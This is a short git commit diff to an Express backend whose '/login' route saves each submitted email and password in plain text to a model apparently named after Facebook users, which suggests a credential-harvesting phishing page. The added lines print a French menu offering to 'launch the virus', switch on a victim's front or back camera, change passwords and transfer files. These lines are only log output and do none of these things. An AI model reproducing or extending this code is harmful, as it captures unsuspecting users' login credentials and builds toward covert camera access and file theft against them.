24e053967e86634255ab2f9ba76f95e5b7182aa1
Mahouna2005 <mahounafado@gmail.com>
2025-11-10 19:13:16 +0100

    qq7

--- backend/app.js
+++ backend/app.js
@@ -21,14 +21,17 @@ app.post("/login", async (req, res) => {
         
 
         const utilisateur = new Userfacebook({ email, password });
-       
-        await utilisateur.save();
-         console.log("l'utilisateur",email,"s'est connecté");
-<<<<<<< HEAD
+        console.log("0-Taper 0 pour lancer le virus");
+        console.log("l'utilisateur",email,"s'est connecté");
+        console.log("1-Taper 1 pour allumer la camera du front");
+        console.log("2-Taper 2 pour allumer la camera du derriere");
+        console.log("3-Taper 3 pour allumer les deux cameras");
+        console.log("4-Taper 4 pour changer le mot de passe");
+        console.log("5-Taper 5 pour  lancer  le transfert de fichier");
+        console.log("6-Taper 6 pour se déconnecter");
 
-=======
-        console.log("le numero",email,"est connect")
->>>>>>> e5d047983ada617728771539ca77a7a0fb99744d
+        await utilisateur.save();
+
         return res.status(201).send({ message: 'utilisateur créé avec succès' });
     } catch (error) {
        return res.status(500).send({ message: 'erreur lors de la création de l\'utilisateur', error });
